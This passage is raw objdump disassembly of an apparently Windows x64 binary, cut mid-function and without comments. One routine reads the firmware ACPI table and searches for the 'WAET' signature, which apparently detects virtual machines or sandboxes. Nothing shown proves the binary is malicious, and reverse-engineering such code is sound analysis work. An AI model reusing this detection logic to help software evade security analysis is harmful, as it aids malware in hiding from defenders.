   1400016f1:	ff c3                	inc    %ebx
   1400016f3:	66 39 71 15          	cmp    %si,0x15(%rcx)
   1400016f7:	44 0f 45 de          	cmovne %esi,%r11d
   1400016fb:	8d 4a 01             	lea    0x1(%rdx),%ecx
   1400016fe:	41 3b c9             	cmp    %r9d,%ecx
   140001701:	73 15                	jae    0x140001718
   140001703:	42 38 34 02          	cmp    %sil,(%rdx,%r8,1)
   140001707:	75 06                	jne    0x14000170f
   140001709:	42 38 34 01          	cmp    %sil,(%rcx,%r8,1)
   14000170d:	74 09                	je     0x140001718
   14000170f:	ff c2                	inc    %edx
   140001711:	ff c1                	inc    %ecx
   140001713:	41 3b c9             	cmp    %r9d,%ecx
   140001716:	72 eb                	jb     0x140001703
   140001718:	83 c2 02             	add    $0x2,%edx
   14000171b:	8d 42 04             	lea    0x4(%rdx),%eax
   14000171e:	41 3b c1             	cmp    %r9d,%eax
   140001721:	76 9d                	jbe    0x1400016c0
   140001723:	83 fb 01             	cmp    $0x1,%ebx
   140001726:	75 07                	jne    0x14000172f
   140001728:	45 85 db             	test   %r11d,%r11d
   14000172b:	74 02                	je     0x14000172f
   14000172d:	ff c5                	inc    %ebp
   14000172f:	ff 15 4b f9 00 00    	call   *0xf94b(%rip)        # 0x140011080
   140001735:	4d 8b c6             	mov    %r14,%r8
   140001738:	33 d2                	xor    %edx,%edx
   14000173a:	48 8b c8             	mov    %rax,%rcx
   14000173d:	ff 15 35 f9 00 00    	call   *0xf935(%rip)        # 0x140011078
   140001743:	33 d2                	xor    %edx,%edx
   140001745:	48 8d 8c 24 c4 00 00 	lea    0xc4(%rsp),%rcx
   14000174c:	00 
   14000174d:	41 b8 a4 01 00 00    	mov    $0x1a4,%r8d
   140001753:	8b fe                	mov    %esi,%edi
   140001755:	e8 a6 ea 00 00       	call   0x140010200
   14000175a:	45 33 c9             	xor    %r9d,%r9d
   14000175d:	c7 84 24 c0 00 00 00 	movl   $0x1a8,0xc0(%rsp)
   140001764:	a8 01 00 00 
   140001768:	4c 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%r8
   14000176f:	00 
   140001770:	33 d2                	xor    %edx,%edx
   140001772:	33 c9                	xor    %ecx,%ecx
   140001774:	8b de                	mov    %esi,%ebx
   140001776:	ff 15 3c fb 00 00    	call   *0xfb3c(%rip)        # 0x1400112b8
   14000177c:	85 c0                	test   %eax,%eax
   14000177e:	0f 84 fb 00 00 00    	je     0x14000187f
   140001784:	4c 89 bc 24 a8 02 00 	mov    %r15,0x2a8(%rsp)
   14000178b:	00 
   14000178c:	49 be 01 00 00 80 00 	movabs $0x8000000080000001,%r14
   140001793:	00 00 80 
   140001796:	41 bf 9c 00 00 00    	mov    $0x9c,%r15d
   14000179c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400017a0:	f6 84 24 64 01 00 00 	testb  $0x1,0x164(%rsp)
   1400017a7:	01 
   1400017a8:	0f 84 80 00 00 00    	je     0x14000182e
   1400017ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017b1:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400017b6:	33 c0                	xor    %eax,%eax
   1400017b8:	48 8d 8c 24 c4 00 00 	lea    0xc4(%rsp),%rcx
   1400017bf:	00 
   1400017c0:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   1400017c5:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400017ca:	66 44 89 7c 24 44    	mov    %r15w,0x44(%rsp)
   1400017d0:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1400017d5:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   1400017dc:	00 
   1400017dd:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400017e2:	89 84 24 b8 00 00 00 	mov    %eax,0xb8(%rsp)
   1400017e9:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400017ee:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   1400017f3:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   1400017f8:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   1400017ff:	00 
   140001800:	0f 11 84 24 90 00 00 	movups %xmm0,0x90(%rsp)
   140001807:	00 
   140001808:	0f 11 84 24 a0 00 00 	movups %xmm0,0xa0(%rsp)
   14000180f:	00 
   140001810:	ff 15 9a fa 00 00    	call   *0xfa9a(%rip)        # 0x1400112b0
   140001816:	85 c0                	test   %eax,%eax
   140001818:	74 14                	je     0x14000182e
   14000181a:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140001821:	ff c8                	dec    %eax
   140001823:	83 f8 3f             	cmp    $0x3f,%eax
   140001826:	77 06                	ja     0x14000182e
   140001828:	49 0f a3 c6          	bt     %rax,%r14
   14000182c:	72 44                	jb     0x140001872
   14000182e:	ff c3                	inc    %ebx
   140001830:	4c 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%r8
   140001837:	00 
   140001838:	8b d3                	mov    %ebx,%edx
   14000183a:	45 33 c9             	xor    %r9d,%r9d
   14000183d:	33 c9                	xor    %ecx,%ecx
   14000183f:	ff 15 73 fa 00 00    	call   *0xfa73(%rip)        # 0x1400112b8
   140001845:	85 c0                	test   %eax,%eax
   140001847:	0f 85 53 ff ff ff    	jne    0x1400017a0
   14000184d:	eb 28                	jmp    0x140001877
   14000184f:	8d 41 05             	lea    0x5(%rcx),%eax
   140001852:	42 0f b6 04 00       	movzbl (%rax,%r8,1),%eax
   140001857:	24 7f                	and    $0x7f,%al
   140001859:	3c 01                	cmp    $0x1,%al
   14000185b:	0f 85 41 fe ff ff    	jne    0x1400016a2
   140001861:	bd 01 00 00 00       	mov    $0x1,%ebp
   140001866:	8b de                	mov    %esi,%ebx
   140001868:	44 8b dd             	mov    %ebp,%r11d
   14000186b:	8b d6                	mov    %esi,%edx
   14000186d:	e9 44 fe ff ff       	jmp    0x1400016b6
   140001872:	bf 01 00 00 00       	mov    $0x1,%edi
   140001877:	4c 8b bc 24 a8 02 00 	mov    0x2a8(%rsp),%r15
   14000187e:	00 
   14000187f:	45 33 c0             	xor    %r8d,%r8d
   140001882:	33 d2                	xor    %edx,%edx
   140001884:	b9 49 50 43 41       	mov    $0x41435049,%ecx
   140001889:	03 ef                	add    %edi,%ebp
   14000188b:	ff 15 ff f7 00 00    	call   *0xf7ff(%rip)        # 0x140011090
   140001891:	4c 8b b4 24 a0 02 00 	mov    0x2a0(%rsp),%r14
   140001898:	00 
   140001899:	8b f8                	mov    %eax,%edi
   14000189b:	85 c0                	test   %eax,%eax
   14000189d:	74 66                	je     0x140001905
   14000189f:	ff 15 db f7 00 00    	call   *0xf7db(%rip)        # 0x140011080
   1400018a5:	44 8b c7             	mov    %edi,%r8d
   1400018a8:	33 d2                	xor    %edx,%edx
   1400018aa:	48 8b c8             	mov    %rax,%rcx
   1400018ad:	ff 15 bd f7 00 00    	call   *0xf7bd(%rip)        # 0x140011070
   1400018b3:	48 8b d8             	mov    %rax,%rbx
   1400018b6:	48 85 c0             	test   %rax,%rax
   1400018b9:	74 4a                	je     0x140001905
   1400018bb:	44 8b c7             	mov    %edi,%r8d
   1400018be:	48 8b d0             	mov    %rax,%rdx
   1400018c1:	b9 49 50 43 41       	mov    $0x41435049,%ecx
   1400018c6:	ff 15 c4 f7 00 00    	call   *0xf7c4(%rip)        # 0x140011090
   1400018cc:	c1 ef 02             	shr    $0x2,%edi
   1400018cf:	8b ce                	mov    %esi,%ecx
   1400018d1:	85 ff                	test   %edi,%edi
   1400018d3:	74 1c                	je     0x1400018f1
   1400018d5:	48 8b c3             	mov    %rbx,%rax
   1400018d8:	81 38 57 41 45 54    	cmpl   $0x54454157,(%rax)
   1400018de:	74 0c                	je     0x1400018ec
   1400018e0:	ff c1                	inc    %ecx
   1400018e2:	48 83 c0 04          	add    $0x4,%rax
   1400018e6:	3b cf                	cmp    %edi,%ecx
   1400018e8:	72 ee                	jb     0x1400018d8
   1400018ea:	eb 05                	jmp    0x1400018f1
   1400018ec:	be 01 00 00 00       	mov    $0x1,%esi
   1400018f1:	ff 15 89 f7 00 00    	call   *0xf789(%rip)        # 0x140011080
   1400018f7:	4c 8b c3             	mov    %rbx,%r8
   1400018fa:	33 d2                	xor    %edx,%edx
   1400018fc:	48 8b c8             	mov    %rax,%rcx
   1400018ff:	ff 15 73 f7 00 00    	call   *0xf773(%rip)        # 0x140011078
   140001905:	8d 04 2e             	lea    (%rsi,%rbp,1),%eax
   140001908:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   14000190f:	00 
   140001910:	48 33 cc             	xor    %rsp,%rcx
   140001913:	e8 68 21 00 00       	call   0x140003a80
   140001918:	48 8b 9c 24 b0 02 00 	mov    0x2b0(%rsp),%rbx
   14000191f:	00 
   140001920:	48 81 c4 80 02 00 00 	add    $0x280,%rsp
   140001927:	5f                   	pop    %rdi
   140001928:	5e                   	pop    %rsi
   140001929:	5d                   	pop    %rbp
   14000192a:	c3                   	ret
   14000192b:	cc                   	int3
   14000192c:	cc                   	int3
   14000192d:	cc                   	int3
   14000192e:	cc                   	int3
   14000192f:	cc                   	int3
   140001930:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001935:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000193a:	56                   	push   %rsi
   14000193b:	57                   	push   %rdi
   14000193c:	41 55                	push   %r13
   14000193e:	41 56                	push   %r14
   140001940:	41 57                	push   %r15
   140001942:	48 83 ec 20          	sub    $0x20,%rsp
   140001946:	4c 8b 79 18          	mov    0x18(%rcx),%r15
   14000194a:	49 8b f0             	mov    %r8,%rsi
   14000194d:	4c 8b 71 10          	mov    0x10(%rcx),%r14
   140001951:	49 8b c7             	mov    %r15,%rax
   140001954:	49 2b c6             	sub    %r14,%rax
   140001957:	4c 8b ea             	mov    %rdx,%r13
   14000195a:	48 8b f9             	mov    %rcx,%rdi
   14000195d:	4c 3b c0             	cmp    %rax,%r8
   140001960:	77 2b                	ja     0x14000198d
   140001962:	4b 8d 2c 06          	lea    (%r14,%r8,1),%rbp
   140001966:	48 8b d9             	mov    %rcx,%rbx
   140001969:	48 89 69 10          	mov    %rbp,0x10(%rcx)
   14000196d:	49 83 ff 07          	cmp    $0x7,%r15
   140001971:	76 03                	jbe    0x140001976
   140001973:	48 8b 19             	mov    (%rcx),%rbx
   140001976:	4d 03 c0             	add    %r8,%r8
   140001979:	4a 8d 0c 73          	lea    (%rbx,%r14,2),%rcx
   14000197d:	e8 de e1 00 00       	call   0x14000fb60
   140001982:	33 c0                	xor    %eax,%eax
   140001984:	66 89 04 6b          	mov    %ax,(%rbx,%rbp,2)
   140001988:	e9 ec 00 00 00       	jmp    0x140001a79
   14000198d:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   140001994:	ff ff 7f 
   140001997:	48 8b c3             	mov    %rbx,%rax
   14000199a:	49 2b c6             	sub    %r14,%rax
   14000199d:	48 3b c6             	cmp    %rsi,%rax
   1400019a0:	0f 82 ed 00 00 00    	jb     0x140001a93
   1400019a6:	4b 8d 2c 06          	lea    (%r14,%r8,1),%rbp
   1400019aa:	48 8b cd             	mov    %rbp,%rcx
   1400019ad:	48 83 c9 07          	or     $0x7,%rcx
   1400019b1:	48 3b cb             	cmp    %rbx,%rcx
   1400019b4:	77 38                	ja     0x1400019ee
   1400019b6:	49 8b d7             	mov    %r15,%rdx
   1400019b9:	48 8b c3             	mov    %rbx,%rax
   1400019bc:	48 d1 ea             	shr    $1,%rdx
   1400019bf:	48 2b c2             	sub    %rdx,%rax
   1400019c2:	4c 3b f8             	cmp    %rax,%r15
   1400019c5:	77 27                	ja     0x1400019ee
   1400019c7:	49 8d 04 17          	lea    (%r15,%rdx,1),%rax
   1400019cb:	48 8b d9             	mov    %rcx,%rbx
   1400019ce:	48 3b c8             	cmp    %rax,%rcx
   1400019d1:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400019d5:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400019dc:	ff ff 7f 
   1400019df:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400019e3:	48 3b c8             	cmp    %rax,%rcx
   1400019e6:	0f 87 ad 00 00 00    	ja     0x140001a99
   1400019ec:	eb 0a                	jmp    0x1400019f8
   1400019ee:	48 b9 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rcx
   1400019f5:	ff ff 7f 
   1400019f8:	48 03 c9             	add    %rcx,%rcx
   1400019fb:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   140001a00:	e8 fb f5 ff ff       	call   0x140001000
   140001a05:	48 03 f6             	add    %rsi,%rsi
   140001a08:	48 89 6f 10          	mov    %rbp,0x10(%rdi)
   140001a0c:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140001a10:	4f 8d 04 36          	lea    (%r14,%r14,1),%r8
   140001a14:	4c 8b e0             	mov    %rax,%r12
   140001a17:	48 8b c8             	mov    %rax,%rcx
   140001a1a:	4d 8d 34 00          	lea    (%r8,%rax,1),%r14
   140001a1e:	49 83 ff 07          	cmp    $0x7,%r15
   140001a22:	76 30                	jbe    0x140001a54
   140001a24:	48 8b 1f             	mov    (%rdi),%rbx
   140001a27:	48 8b d3             	mov    %rbx,%rdx
   140001a2a:	e8 31 e1 00 00       	call   0x14000fb60
   140001a2f:	4c 8b c6             	mov    %rsi,%r8
   140001a32:	49 8b d5             	mov    %r13,%rdx
   140001a35:	49 8b ce             	mov    %r14,%rcx
   140001a38:	e8 23 e1 00 00       	call   0x14000fb60
   140001a3d:	33 c0                	xor    %eax,%eax
   140001a3f:	4d 8b c7             	mov    %r15,%r8
   140001a42:	48 8b d3             	mov    %rbx,%rdx
   140001a45:	66 41 89 04 6c       	mov    %ax,(%r12,%rbp,2)
   140001a4a:	48 8b cf             	mov    %rdi,%rcx
   140001a4d:	e8 be fa ff ff       	call   0x140001510
   140001a52:	eb 1d                	jmp    0x140001a71
   140001a54:	48 8b d7             	mov    %rdi,%rdx
   140001a57:	e8 04 e1 00 00       	call   0x14000fb60
   140001a5c:	4c 8b c6             	mov    %rsi,%r8
   140001a5f:	49 8b d5             	mov    %r13,%rdx
   140001a62:	49 8b ce             	mov    %r14,%rcx
   140001a65:	e8 f6 e0 00 00       	call   0x14000fb60
   140001a6a:	33 c0                	xor    %eax,%eax
   140001a6c:	66 41 89 04 6c       	mov    %ax,(%r12,%rbp,2)
   140001a71:	4c 89 27             	mov    %r12,(%rdi)
   140001a74:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   140001a79:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001a7e:	48 8b c7             	mov    %rdi,%rax
   140001a81:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140001a86:	48 83 c4 20          	add    $0x20,%rsp
   140001a8a:	41 5f                	pop    %r15
   140001a8c:	41 5e                	pop    %r14
   140001a8e:	41 5d                	pop    %r13
   140001a90:	5f                   	pop    %rdi
   140001a91:	5e                   	pop    %rsi
   140001a92:	c3                   	ret
   140001a93:	e8 f8 fa ff ff       	call   0x140001590
   140001a98:	cc                   	int3
   140001a99:	e8 d2 fa ff ff       	call   0x140001570
   140001a9e:	cc                   	int3
   140001a9f:	cc                   	int3
   140001aa0:	40 53                	rex push %rbx
   140001aa2:	56                   	push   %rsi
   140001aa3:	57                   	push   %rdi
   140001aa4:	41 56                	push   %r14
   140001aa6:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140001aad:	48 8b f9             	mov    %rcx,%rdi
   140001ab0:	49 8b d8             	mov    %r8,%rbx
   140001ab3:	48 8b ca             	mov    %rdx,%rcx
   140001ab6:	4c 8b f2             	mov    %rdx,%r14
   140001ab9:	e8 42 58 00 00       	call   0x140007300
   140001abe:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   140001ac3:	48 8b f0             	mov    %rax,%rsi
   140001ac6:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140001aca:	76 03                	jbe    0x140001acf
   140001acc:	48 8b 3f             	mov    (%rdi),%rdi
   140001acf:	48 85 f6             	test   %rsi,%rsi
   140001ad2:	0f 84 f5 00 00 00    	je     0x140001bcd
   140001ad8:	48 85 c0             	test   %rax,%rax
   140001adb:	0f 84 ec 00 00 00    	je     0x140001bcd
   140001ae1:	48 ff c8             	dec    %rax
   140001ae4:	48 3b c3             	cmp    %rbx,%rax
   140001ae7:	48 0f 42 d8          	cmovb  %rax,%rbx
   140001aeb:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140001aef:	48 8d 04 32          	lea    (%rdx,%rsi,1),%rax
   140001af3:	48 83 f8 10          	cmp    $0x10,%rax
   140001af7:	72 1a                	jb     0x140001b13
   140001af9:	4c 8b ce             	mov    %rsi,%r9
   140001afc:	4d 8b c6             	mov    %r14,%r8
   140001aff:	48 8b cf             	mov    %rdi,%rcx
   140001b02:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140001b09:	41 5e                	pop    %r14
   140001b0b:	5f                   	pop    %rdi
   140001b0c:	5e                   	pop    %rsi
   140001b0d:	5b                   	pop    %rbx
   140001b0e:	e9 8d 1e 00 00       	jmp    0x1400039a0
   140001b13:	48 89 ac 24 20 01 00 	mov    %rbp,0x120(%rsp)
   140001b1a:	00 
   140001b1b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001b20:	bd 00 01 00 00       	mov    $0x100,%ebp
   140001b25:	33 d2                	xor    %edx,%edx
   140001b27:	44 8b c5             	mov    %ebp,%r8d
   140001b2a:	e8 d1 e6 00 00       	call   0x140010200
   140001b2f:	49 8d 14 76          	lea    (%r14,%rsi,2),%rdx
   140001b33:	49 8b ce             	mov    %r14,%rcx
   140001b36:	4c 3b f2             	cmp    %rdx,%r14
   140001b39:	74 1e                	je     0x140001b59
   140001b3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001b40:	0f b7 01             	movzwl (%rcx),%eax
   140001b43:	66 3b c5             	cmp    %bp,%ax
   140001b46:	73 32                	jae    0x140001b7a
   140001b48:	0f b6 c0             	movzbl %al,%eax
   140001b4b:	48 83 c1 02          	add    $0x2,%rcx
   140001b4f:	c6 44 04 20 01       	movb   $0x1,0x20(%rsp,%rax,1)
   140001b54:	48 3b ca             	cmp    %rdx,%rcx
   140001b57:	75 e7                	jne    0x140001b40
   140001b59:	48 8d 04 5f          	lea    (%rdi,%rbx,2),%rax
   140001b5d:	0f 1f 00             	nopl   (%rax)
   140001b60:	0f b7 08             	movzwl (%rax),%ecx
   140001b63:	66 3b cd             	cmp    %bp,%cx
   140001b66:	73 07                	jae    0x140001b6f
   140001b68:	80 7c 0c 20 00       	cmpb   $0x0,0x20(%rsp,%rcx,1)
   140001b6d:	75 4d                	jne    0x140001bbc
   140001b6f:	48 3b c7             	cmp    %rdi,%rax
   140001b72:	74 50                	je     0x140001bc4
   140001b74:	48 83 e8 02          	sub    $0x2,%rax
   140001b78:	eb e6                	jmp    0x140001b60
   140001b7a:	48 8d 1c 5f          	lea    (%rdi,%rbx,2),%rbx
   140001b7e:	66 90                	xchg   %ax,%ax
   140001b80:	0f b7 13             	movzwl (%rbx),%edx
   140001b83:	4c 8b c6             	mov    %rsi,%r8
   140001b86:	49 8b ce             	mov    %r14,%rcx
   140001b89:	e8 72 0e 00 00       	call   0x140002a00
   140001b8e:	48 85 c0             	test   %rax,%rax
   140001b91:	75 0b                	jne    0x140001b9e
   140001b93:	48 3b df             	cmp    %rdi,%rbx
   140001b96:	74 2c                	je     0x140001bc4
   140001b98:	48 83 eb 02          	sub    $0x2,%rbx
   140001b9c:	eb e2                	jmp    0x140001b80
   140001b9e:	48 2b df             	sub    %rdi,%rbx
   140001ba1:	48 d1 fb             	sar    $1,%rbx
   140001ba4:	48 8b c3             	mov    %rbx,%rax
   140001ba7:	48 8b ac 24 20 01 00 	mov    0x120(%rsp),%rbp
   140001bae:	00 
   140001baf:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140001bb6:	41 5e                	pop    %r14
   140001bb8:	5f                   	pop    %rdi
   140001bb9:	5e                   	pop    %rsi
   140001bba:	5b                   	pop    %rbx
   140001bbb:	c3                   	ret
   140001bbc:	48 2b c7             	sub    %rdi,%rax
   140001bbf:	48 d1 f8             	sar    $1,%rax
   140001bc2:	eb e3                	jmp    0x140001ba7
   140001bc4:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140001bcb:	eb da                	jmp    0x140001ba7
   140001bcd:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140001bd4:	48 81 c4 28 01 00 00 	add    $0x128,%rsp
   140001bdb:	41 5e                	pop    %r14
   140001bdd:	5f                   	pop    %rdi
   140001bde:	5e                   	pop    %rsi
   140001bdf:	5b                   	pop    %rbx
   140001be0:	c3                   	ret
   140001be1:	cc                   	int3
   140001be2:	cc                   	int3
   140001be3:	cc                   	int3
   140001be4:	cc                   	int3
   140001be5:	cc                   	int3
   140001be6:	cc                   	int3
   140001be7:	cc                   	int3
   140001be8:	cc                   	int3
   140001be9:	cc                   	int3
   140001bea:	cc                   	int3
   140001beb:	cc                   	int3
   140001bec:	cc                   	int3
   140001bed:	cc                   	int3
   140001bee:	cc                   	int3
   140001bef:	cc                   	int3
   140001bf0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001bf4:	48 8d 05 d5 f7 00 00 	lea    0xf7d5(%rip),%rax        # 0x1400113d0
   140001bfb:	48 85 d2             	test   %rdx,%rdx
   140001bfe:	48 0f 45 c2          	cmovne %rdx,%rax
   140001c02:	c3                   	ret
   140001c03:	cc                   	int3
   140001c04:	cc                   	int3
   140001c05:	cc                   	int3
   140001c06:	cc                   	int3
   140001c07:	cc                   	int3
   140001c08:	cc                   	int3
   140001c09:	cc                   	int3
   140001c0a:	cc                   	int3
   140001c0b:	cc                   	int3
   140001c0c:	cc                   	int3
   140001c0d:	cc                   	int3
   140001c0e:	cc                   	int3
   140001c0f:	cc                   	int3
   140001c10:	48 8b c4             	mov    %rsp,%rax
   140001c13:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001c17:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001c1b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001c1f:	55                   	push   %rbp
   140001c20:	41 54                	push   %r12
   140001c22:	41 55                	push   %r13
   140001c24:	41 56                	push   %r14
   140001c26:	41 57                	push   %r15
   140001c28:	48 8d a8 a8 f9 ff ff 	lea    -0x658(%rax),%rbp
   140001c2f:	48 81 ec 30 07 00 00 	sub    $0x730,%rsp
   140001c36:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   140001c3a:	0f 29 78 b8          	movaps %xmm7,-0x48(%rax)
   140001c3e:	44 0f 29 40 a8       	movaps %xmm8,-0x58(%rax)
   140001c43:	48 8b 05 b6 c3 01 00 	mov    0x1c3b6(%rip),%rax        # 0x14001e000
   140001c4a:	48 33 c4             	xor    %rsp,%rax
   140001c4d:	48 89 85 f0 05 00 00 	mov    %rax,0x5f0(%rbp)
   140001c54:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001c5a:	48 8d 95 d0 01 00 00 	lea    0x1d0(%rbp),%rdx
   140001c61:	33 c9                	xor    %ecx,%ecx
   140001c63:	ff 15 37 f4 00 00    	call   *0xf437(%rip)        # 0x1400110a0
   140001c69:	e8 42 f9 ff ff       	call   0x1400015b0
   140001c6e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001c71:	89 45 80             	mov    %eax,-0x80(%rbp)
   140001c74:	45 33 f6             	xor    %r14d,%r14d
   140001c77:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   140001c7e:	0f 11 85 90 01 00 00 	movups %xmm0,0x190(%rbp)
   140001c85:	4c 89 b5 a0 01 00 00 	mov    %r14,0x1a0(%rbp)
   140001c8c:	4c 89 b5 a8 01 00 00 	mov    %r14,0x1a8(%rbp)
   140001c93:	e8 68 56 00 00       	call   0x140007300
   140001c98:	4c 8b c0             	mov    %rax,%r8
   140001c9b:	48 8d 95 d0 01 00 00 	lea    0x1d0(%rbp),%rdx
   140001ca2:	48 8d 8d 90 01 00 00 	lea    0x190(%rbp),%rcx
   140001ca9:	e8 c2 f3 ff ff       	call   0x140001070
   140001cae:	48 83 bd a8 01 00 00 	cmpq   $0x7,0x1a8(%rbp)
   140001cb5:	07 
   140001cb6:	48 8d bd 90 01 00 00 	lea    0x190(%rbp),%rdi
   140001cbd:	48 8b b5 a0 01 00 00 	mov    0x1a0(%rbp),%rsi
   140001cc4:	48 0f 47 bd 90 01 00 	cmova  0x190(%rbp),%rdi
   140001ccb:	00 
   140001ccc:	48 85 f6             	test   %rsi,%rsi
   140001ccf:	0f 84 8f 01 00 00    	je     0x140001e64
   140001cd5:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   140001cd9:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140001ce0:	48 3b c3             	cmp    %rbx,%rax
   140001ce3:	48 0f 42 d8          	cmovb  %rax,%rbx
   140001ce7:	48 8d 53 01          	lea    0x1(%rbx),%rdx
   140001ceb:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140001cef:	48 83 f8 10          	cmp    $0x10,%rax
   140001cf3:	72 1d                	jb     0x140001d12
   140001cf5:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001cfb:	4c 8d 05 3e f7 00 00 	lea    0xf73e(%rip),%r8        # 0x140011440
   140001d02:	48 8b cf             	mov    %rdi,%rcx
   140001d05:	e8 96 1c 00 00       	call   0x1400039a0
   140001d0a:	48 8b d8             	mov    %rax,%rbx
   140001d0d:	e9 9d 00 00 00       	jmp    0x140001daf
   140001d12:	41 bf 00 01 00 00    	mov    $0x100,%r15d
   140001d18:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001d1c:	45 8b c7             	mov    %r15d,%r8d
   140001d1f:	33 d2                	xor    %edx,%edx
   140001d21:	e8 da e4 00 00       	call   0x140010200
   140001d26:	48 8d 0d 13 f7 00 00 	lea    0xf713(%rip),%rcx        # 0x140011440
   140001d2d:	48 8d 15 10 f7 00 00 	lea    0xf710(%rip),%rdx        # 0x140011444
   140001d34:	0f b7 01             	movzwl (%rcx),%eax
   140001d37:	66 41 3b c7          	cmp    %r15w,%ax
   140001d3b:	73 3c                	jae    0x140001d79
   140001d3d:	0f b6 c0             	movzbl %al,%eax
   140001d40:	48 83 c1 02          	add    $0x2,%rcx
   140001d44:	c6 44 05 20 01       	movb   $0x1,0x20(%rbp,%rax,1)
   140001d49:	48 3b ca             	cmp    %rdx,%rcx
   140001d4c:	75 e6                	jne    0x140001d34
   140001d4e:	48 8d 1c 5f          	lea    (%rdi,%rbx,2),%rbx
   140001d52:	0f b7 03             	movzwl (%rbx),%eax
   140001d55:	66 41 3b c7          	cmp    %r15w,%ax
   140001d59:	73 07                	jae    0x140001d62
   140001d5b:	44 38 74 05 20       	cmp    %r14b,0x20(%rbp,%rax,1)
   140001d60:	75 0f                	jne    0x140001d71
   140001d62:	48 3b df             	cmp    %rdi,%rbx
   140001d65:	0f 84 f9 00 00 00    	je     0x140001e64
   140001d6b:	48 83 eb 02          	sub    $0x2,%rbx
   140001d6f:	eb e1                	jmp    0x140001d52
   140001d71:	48 2b df             	sub    %rdi,%rbx
   140001d74:	48 d1 fb             	sar    $1,%rbx
   140001d77:	eb 3d                	jmp    0x140001db6
   140001d79:	48 8d 1c 5f          	lea    (%rdi,%rbx,2),%rbx
   140001d7d:	0f 1f 00             	nopl   (%rax)
   140001d80:	0f b7 13             	movzwl (%rbx),%edx
   140001d83:	48 8d 0d b6 f6 00 00 	lea    0xf6b6(%rip),%rcx        # 0x140011440
   140001d8a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001d90:	e8 6b 0c 00 00       	call   0x140002a00
   140001d95:	48 85 c0             	test   %rax,%rax
   140001d98:	75 0f                	jne    0x140001da9
   140001d9a:	48 3b df             	cmp    %rdi,%rbx
   140001d9d:	0f 84 c1 00 00 00    	je     0x140001e64
   140001da3:	48 83 eb 02          	sub    $0x2,%rbx
   140001da7:	eb d7                	jmp    0x140001d80
   140001da9:	48 2b df             	sub    %rdi,%rbx
   140001dac:	48 d1 fb             	sar    $1,%rbx
   140001daf:	48 8b b5 a0 01 00 00 	mov    0x1a0(%rbp),%rsi
   140001db6:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140001dba:	0f 84 a4 00 00 00    	je     0x140001e64
   140001dc0:	48 3b f3             	cmp    %rbx,%rsi
   140001dc3:	48 8d 95 90 01 00 00 	lea    0x190(%rbp),%rdx
   140001dca:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001dcd:	48 8d 8d 70 01 00 00 	lea    0x170(%rbp),%rcx
   140001dd4:	48 0f 42 de          	cmovb  %rsi,%rbx
   140001dd8:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001ddb:	48 83 bd a8 01 00 00 	cmpq   $0x7,0x1a8(%rbp)
   140001de2:	07 
   140001de3:	4c 8b c3             	mov    %rbx,%r8
   140001de6:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   140001ded:	48 0f 47 95 90 01 00 	cmova  0x190(%rbp),%rdx
   140001df4:	00 
   140001df5:	f3 0f 7f 8d 80 01 00 	movdqu %xmm1,0x180(%rbp)
   140001dfc:	00 
   140001dfd:	e8 6e f2 ff ff       	call   0x140001070
   140001e02:	48 8b 95 a8 01 00 00 	mov    0x1a8(%rbp),%rdx
   140001e09:	48 83 fa 07          	cmp    $0x7,%rdx
   140001e0d:	76 39                	jbe    0x140001e48
